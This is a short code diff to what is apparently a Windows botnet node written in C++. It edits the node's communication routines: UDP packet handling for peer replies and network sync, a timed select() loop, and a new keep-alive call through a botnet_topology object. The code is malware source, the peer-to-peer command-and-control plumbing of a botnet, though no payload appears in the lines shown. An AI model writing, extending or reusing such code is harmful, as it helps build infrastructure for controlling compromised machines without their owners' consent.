@@ -1,3 +1,6 @@
+#include "Communication.h"
+
+#include <thread>
 #include <malloc.h>
 #include <WS2tcpip.h>
 #pragma comment(lib, "ws2_32.lib")
@@ -152,7 +155,7 @@ static void handle_udp_connections()
 	case PACK_TYPE::SYNC_REPLY:
 		break;
 	case PACK_TYPE::PEER_REPLY:
-		botnet_topology.addPeer(*p, udp_sock);
+		botnet_topology.addPeer(data, udp_sock);
 		break;
 	case PACK_TYPE::NETWORK_SYNC:
 		botnet_topology.handleSync(data);
@@ -181,8 +184,8 @@ void handle_incomings()
 	while (1)
 	{
 		copy = master;
-		
-		size_t socketCount = select(0, &copy, NULL, NULL, NULL);
+		struct timeval tv = { 30, 0 };   // sleep for 30 seconds.
+		size_t socketCount = select(0, &copy, NULL, NULL, &tv);
 
 		for (size_t i = 0; i < socketCount; i++)
 		{
@@ -200,6 +203,7 @@ void handle_incomings()
 				FD_CLR(s, &master);
 			}
 		}
+		botnet_topology.keepAlive(udp_sock);
 	}
 }
 /* end handling incomings */
